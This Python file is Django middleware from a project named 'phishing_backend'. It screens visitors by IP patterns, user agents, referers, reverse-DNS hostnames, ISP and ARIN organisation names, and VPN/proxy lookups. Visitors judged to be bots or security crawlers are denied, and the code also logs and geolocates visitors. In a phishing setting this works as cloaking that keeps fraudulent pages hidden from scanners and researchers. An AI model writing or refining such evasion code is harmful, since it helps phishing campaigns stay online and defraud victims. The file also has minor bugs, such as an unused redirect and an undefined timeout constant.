# phishing_backend/api/middleware/block_ips_middleware.py
from datetime import datetime
import json
import re
from urllib.parse import urlparse

import requests
from core.Bots.blockeds.bot_patterns import bot_patterns_REMOTE_ADDR
from core.Bots.blockeds.user_agents import bot_keywords_USER_AGENTS
from core.Bots.blockeds.browser_agents import bot_keywords_BROWSER_AGENTS
from core.Bots.blockeds.blocked_referer import bot_BLOCKED_REFERERS
from core.Bots.blockeds.hostnames import bot_patterns_HOSTNAME
from core.Bots.blockeds.shit_isps import bot_keywords_SHIT_ISPS
from core.Bots.blockeds.bad_names import bot_keywords_BAD_NAMES

from django.http import HttpResponseForbidden
from user_agents import parse
from core.app_config import app_settings as app_set

import socket

# def block_ips_middleware(get_response):
#     def middleware(request):
#         client_ip = request.META.get('REMOTE_ADDR')
#
#         print('##############################')
#         print(client_ip)
#
#         if client_ip in BLOCKED_IPS:
#             return HttpResponseForbidden("Access Denied")
#
#         response = get_response(request)
#         return response
#
#     return middleware


# Global pattern cache - compiled once on module load
_COMPILED_PATTERNS = {}
_PATTERN_VERSION = None

# Bot detection metrics storage
_BOT_METRICS = {
    'total_requests': 0,
    'blocked_requests': 0,
    'bot_detections': 0,
    'latency_samples': [],
    'pattern_hits': {},
    'start_time': None
}

import re
from django.http import HttpResponseForbidden
import os
from urllib.parse import urlparse
from django.http import HttpResponseForbidden, HttpResponseRedirect

from django.core.cache import cache
from django.conf import settings

def record_bot_metrics(bot_detected=False, latency_ms=0, pattern_type=None):
    """Record bot detection metrics for monitoring"""
    import time

    if _BOT_METRICS['start_time'] is None:
        _BOT_METRICS['start_time'] = time.time()

    _BOT_METRICS['total_requests'] += 1

    if bot_detected:
        _BOT_METRICS['blocked_requests'] += 1
        _BOT_METRICS['bot_detections'] += 1

    # Track latency (keep last 100 samples)
    _BOT_METRICS['latency_samples'].append(latency_ms)
    if len(_BOT_METRICS['latency_samples']) > 100:
        _BOT_METRICS['latency_samples'].pop(0)

    # Track pattern hits
    if pattern_type:
        _BOT_METRICS['pattern_hits'][pattern_type] = _BOT_METRICS['pattern_hits'].get(pattern_type, 0) + 1

def get_bot_metrics():
    """Get current bot detection metrics"""
    import time

    current_time = time.time()
    uptime_seconds = current_time - (_BOT_METRICS['start_time'] or current_time)

    # Calculate rates
    total_requests = _BOT_METRICS['total_requests']
    blocked_requests = _BOT_METRICS['blocked_requests']

    block_rate = (blocked_requests / total_requests * 100) if total_requests > 0 else 0

    # Calculate average latency
    avg_latency = sum(_BOT_METRICS['latency_samples']) / len(_BOT_METRICS['latency_samples']) if _BOT_METRICS['latency_samples'] else 0

    return {
        'uptime_seconds': uptime_seconds,
        'total_requests': total_requests,
        'blocked_requests': blocked_requests,
        'block_rate_percent': round(block_rate, 2),
        'avg_latency_ms': round(avg_latency, 2),
        'pattern_hits': _BOT_METRICS['pattern_hits'].copy(),
        'recent_latency_samples': _BOT_METRICS['latency_samples'][-10:]  # Last 10 samples
    }

def get_pattern_version():
    """Generate a version hash of all pattern files for cache invalidation"""
    import hashlib

    patterns_content = ""
    pattern_files = [
        bot_patterns_REMOTE_ADDR,
        bot_patterns_HOSTNAME,
        bot_keywords_USER_AGENTS,
        bot_keywords_BROWSER_AGENTS,
        bot_BLOCKED_REFERERS,
        bot_keywords_SHIT_ISPS,
        bot_keywords_BAD_NAMES
    ]

    for pattern_list in pattern_files:
        patterns_content += str(pattern_list)

    return hashlib.md5(patterns_content.encode()).hexdigest()

def get_compiled_patterns():
    """Get pre-compiled regex patterns with caching and version checking"""
    global _PATTERN_VERSION

    current_version = get_pattern_version()

    # Check if patterns need recompilation
    if _COMPILED_PATTERNS and _PATTERN_VERSION == current_version:
        return _COMPILED_PATTERNS

    # Recompile patterns if version changed
    _COMPILED_PATTERNS.clear()
    _COMPILED_PATTERNS['remote_addr'] = [re.compile(pattern) for pattern in bot_patterns_REMOTE_ADDR]
    _COMPILED_PATTERNS['hostname'] = [re.compile(pattern) for pattern in bot_patterns_HOSTNAME]
    _PATTERN_VERSION = current_version

    return _COMPILED_PATTERNS


def block_ips_middleware(get_response):

    def middleware(request):
        import time

        start_time = time.time()
        bot_count = 0
        app_settings = app_set
        client_ip = get_client_ip(request)
        user_agent_string = request.META.get("HTTP_USER_AGENT", "")
        referer = request.META.get("HTTP_REFERER", None)  # Get the referer header
        hostname_ip = get_hostname_from_ip(client_ip)

        # Check for bots
        bot_response, detection_reasons = bot_check_one(client_ip, user_agent_string, referer, hostname_ip)

        # Calculate latency
        end_time = time.time()
        latency_ms = (end_time - start_time) * 1000

        # Record metrics
        bot_detected = bot_response is not None
        pattern_type = detection_reasons[0] if detection_reasons else None
        record_bot_metrics(bot_detected=bot_detected, latency_ms=latency_ms, pattern_type=pattern_type)

        if bot_response:
            return bot_response  # If a bot is detected, return the Forbidden response

        response = get_response(request)
        return response

    return middleware


def bot_check_one(client_ip, user_agent_string, referer, hostname_ip):
    compiled_patterns = get_compiled_patterns()

    detection_reasons = []
    high_confidence_hits = 0
    score = 0

    def add_detection(reason, high=False):
        nonlocal score, high_confidence_hits
        score += 1
        detection_reasons.append(reason)
        if high:
            high_confidence_hits += 1

    if settings.BOT_ENABLE_REMOTE_ADDR_CHECK:
        if client_ip not in settings.ALLOWED_PROXY_IPS and any(pattern.match(client_ip) for pattern in compiled_patterns['remote_addr']):
            add_detection('ip_pattern', high=True)

    if check_user_agent_for_bots(user_agent_string) > 0:
        add_detection('user_agent', high=True)

    if check_user_agent_for_bots_browser(user_agent_string) > 0:
        add_detection('browser_agent', high=True)

    if referer and check_referer_for_bots(referer) > 0:
        add_detection('referer')

    if settings.BOT_ENABLE_HOSTNAME_CHECK:
        if hostname_ip and hostname_ip not in settings.ALLOWED_PROXY_HOSTNAMES and check_hostname_for_bots(hostname_ip) > 0:
            add_detection('hostname', high=True)

    if settings.BOT_ENABLE_ISP_CHECK:
        if check_isp_for_bots(client_ip) > 0:
            add_detection('isp')

    if check_for_bots(user_agent_string) > 0:
        add_detection('user_agent_general')

    if settings.BOT_ENABLE_RDAP_CHECK:
        if check_ip_bot_or_human(client_ip) > 0:
            add_detection('arin_whois', high=True)

    block = False
    if high_confidence_hits >= settings.BOT_HIGH_CONFIDENCE_SCORE:
        block = True
    elif score >= settings.BOT_BLOCK_THRESHOLD:
        block = True

    if block:
        log_bot_details(score, client_ip, user_agent_string, detection_reasons)
        return HttpResponseForbidden("Access Denied"), detection_reasons

    return None, detection_reasons




def log_bot_details(bot_count, ip, user_agent, detection_reasons=None):
    if bot_count != 0:
        # Get the current date and time
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")

        # Get the OS and Browser
        os_info = get_user_os(user_agent)
        browser_info = get_user_browser(user_agent)
        #print("#######################")
        #print(browser_info)
        #print(os_info)

        # Create the log message
        message = f"+++++[ BOT - Bot-Crawler.py ]+++++\n"
        message += f"IP         : {ip}\n"
        message += f"OS         : {os_info}\n"
        message += f"Browser    : {browser_info}\n"
        message += f"User-Agent : {user_agent}\n"
        if detection_reasons:
            message += f"Reasons    : {', '.join(detection_reasons)}\n"
        message += f"+++++[ ######### ]+++++\n\n"

        # Write the message to a log file
        with open("./Logs/botlogs.txt", "a+") as log_file:
            log_file.write(message)

        # Redirect the user to a search page
        redirect_url = f"https://href.li/?https://www.google.com/search?q="
        return HttpResponseRedirect(redirect_url)


def get_user_browser(user_agent):
    user_agent_info = parse(user_agent)

    # Extract browser
    browser = user_agent_info.browser.family

    return browser


def get_user_os(user_agent):
    user_agent_info = parse(user_agent)

    # Extract OS
    os = user_agent_info.os.family

    return os


def check_user_agent_for_bots(user_agent):
    bot_count = 0
    if user_agent:
        # Convert to lowercase once for efficiency
        user_agent_lower = user_agent.lower()
        for keyword in bot_keywords_USER_AGENTS:
            if keyword.lower() in user_agent_lower:  # Case-insensitive check
                bot_count += 1

    return bot_count


def check_user_agent_for_bots_browser(user_agent):
    bot_count = 0

    if user_agent:
        user_agent_lower = user_agent.lower()
        for agent in bot_keywords_BROWSER_AGENTS:
            if agent.lower() in user_agent_lower:  # Case-insensitive check
                bot_count += 1

    return bot_count


def check_referer_for_bots(http_referer):
    bot_count = 0
    if http_referer:
        # Parse the referer URL to get the host
        parsed_referer = urlparse(http_referer)
        referer_host = parsed_referer.hostname

        if referer_host in bot_BLOCKED_REFERERS:
            bot_count += 1

    return bot_count


def get_hostname_from_ip(ip):
    # Check cache first
    cache_key = f"hostname:{ip}"
    cached_hostname = cache.get(cache_key)
    if cached_hostname is not None:
        return cached_hostname

    try:
        # Perform reverse DNS lookup
        hostname, _, _ = socket.gethostbyaddr(ip)
        # Cache the result
        cache.set(cache_key, hostname, settings.BOT_CACHE_TIMEOUT)
        return hostname
    except socket.herror:
        # Cache None result for shorter time to retry later
        cache.set(cache_key, None, 300)  # 5 minutes
        # If there's an error (e.g., no hostname found), return None
        return None


def check_hostname_for_bots(hostname):
    bot_count = 0
    compiled_patterns = get_compiled_patterns()

    if hostname:
        for pattern in compiled_patterns['hostname']:
            if pattern.search(hostname.lower()):  # Case-insensitive check
                bot_count += 1

    return bot_count


def check_isp_for_bots(user_ip=None):
    """Check if the ISP belongs to known suspicious ISPs and increment bot count."""

    # Default IP if no IP is provided
    ipp = user_ip if user_ip and user_ip != "" else "1.1.1.1"

    # Check cache first
    cache_key = f"isp_info:{ipp}"
    cached_result = cache.get(cache_key)
    if cached_result is not None:
        return cached_result

    try:
        # Fetch ISP information from ipinfo.io
        response = requests.get(f"http://ipinfo.io/{ipp}/org")
        ISP = response.text.strip()

        if not ISP:
            cache.set(cache_key, 0, ISP_CACHE_TIMEOUT)
            return 0  # Return if no ISP data is found

        # Initialize bot count
        bot_count = 0

        # Check if ISP matches any suspicious ISPs
        for isp in bot_keywords_SHIT_ISPS:
            if (
                isp.lower() in ISP.lower()
            ):  # Check if ISP is in the list (case-insensitive)
                bot_count += 1

        # Cache the result
        cache.set(cache_key, bot_count, settings.ISP_CACHE_TIMEOUT)
        return bot_count

    except requests.RequestException:
        # Cache error result for shorter time to retry later
        cache.set(cache_key, 0, 300)  # 5 minutes
        return 0  # Return if there's any error in the HTTP request



def check_for_bots(user_agent):
    #bot_count = 0
    """Check if the user agent contains known bot-related keywords."""
    if not user_agent or user_agent in ["", " ", "\t"]:
        return 0  # Treat invalid user agents as having no bot presence

    user_agent = user_agent.lower()  # Convert user agent to lowercase
    bot_count = sum(
        1 for keyword in bot_keywords_USER_AGENTS if keyword.lower() in user_agent
    )

    return bot_count





def check_ip_bot_or_human(ip):
    # Skip check for localhost and private IPs
    if ip in ('127.0.0.1', 'localhost') or ip.startswith(('10.', '172.16.', '192.168.')):
        return 0
        
    # Check cache first
    cache_key = f"arin_info:{ip}"
    cached_result = cache.get(cache_key)
    if cached_result is not None:
        return cached_result

    try:
        url = f"https://rdap.arin.net/registry/ip/{ip}"
        # Perform a GET request to fetch the data
        response = requests.get(url, timeout=5)  # Add timeout
        response.raise_for_status()  # Raise exception for bad status codes
        data = response.text

        # Parsing the data
        try:
            # Convert the data to a dictionary from JSON format
            data_dict = json.loads(data)
            
            # Extract the organization name
            org_name = data_dict.get("name", "").replace('"', "").replace(" ", "").replace("\n", "")
            
            # Split the name by '-' and get the first part
            final = org_name.split('-')[0]
            
            # Check if the organization name is in the bad names list
            result = 1 if final in bot_keywords_BAD_NAMES else 0
            
            # Cache the result
            cache.set(cache_key, result, settings.BOT_CACHE_TIMEOUT)
            return result
            
        except (json.JSONDecodeError, KeyError, AttributeError):
            # If there's any error parsing the response, treat as non-bot
            cache.set(cache_key, 0, 300)  # Cache for 5 minutes
            return 0
            
    except requests.RequestException:
        # If there's any network error, treat as non-bot
        cache.set(cache_key, 0, 300)  # Cache for 5 minutes
        return 0
    




def get_client_ip(request):
    ipaddress = request.META.get('HTTP_X_FORWARDED_FOR', None)
    
    # If the X-Forwarded-For header is not present, use the REMOTE_ADDR header
    if not ipaddress:
        ipaddress = request.META.get('REMOTE_ADDR', 'Unknown')
    
    # If the request is going through a proxy, the X-Forwarded-For header can contain a comma-separated list of IPs.
    # We want the first IP in that list.
    if ipaddress and ',' in ipaddress:
        ipaddress = ipaddress.split(',')[0]

    return ipaddress









#########################



def log_client(app_settings, client_id, useragent):
    if app_settings.get("log_user") == "1":
        # Log Client
        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
        user_agent = useragent
        log_message = f"[{date}] CLIENT LOGGED *** {client_id} *** [{user_agent}]\n"

        with open("Logs/logs.txt", "a") as logfile:
            logfile.write(log_message)




def check_proxy(settings, ip):
    if settings.get("proxy_block") == "1":
        # Check VPN | Proxy
        url = f"https://blackbox.ipinfo.app/lookup/{ip}"

        try:
            response = requests.get(url, verify=True)
           # print(response.text)

            resp = response.text.strip()  # Get the response and strip any excess whitespace

            #print("#################")
            #print(resp)
            if ip != "127.0.0.1" and resp.lower() == "y":
                # Log proxy blocking action
                with open("Logs/proxy-block.txt", "a") as click:
                    date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
                    click.write(f"{ip}|{date}|VPN/Proxy\n")

                return 1  # Return 1 if proxy is detected
            #elif ip != "127.0.0.1" and resp.lower() == "n":
            return 0  # Return 0 if no proxy is detected

        except requests.exceptions.RequestException as e:
            # Handle possible network or request errors
            print(f"Error: {e}")
            return 0  # Return 0 if an error occurs during the request




def get_country_from_ip(ip_address):
    if not ip_address or ip_address in ("Unknown", "127.0.0.1", "localhost"):
        return "Unknown"
    url = f"http://ipinfo.io/{ip_address}/json"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            try:
                data = response.json()
            except ValueError:
                return "Unknown"
            return data.get("country") or "Unknown"
    except requests.RequestException:
        return "Unknown"
    return "Unknown"



def get_city_from_ip(ip_address):
    if not ip_address or ip_address in ("Unknown", "127.0.0.1", "localhost"):
        return "Unknown"
    url = f"http://ipinfo.io/{ip_address}/json"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            try:
                data = response.json()
            except ValueError:
                return "Unknown"
            return data.get("city") or "Unknown"
    except requests.RequestException:
        return "Unknown"
    return "Unknown"
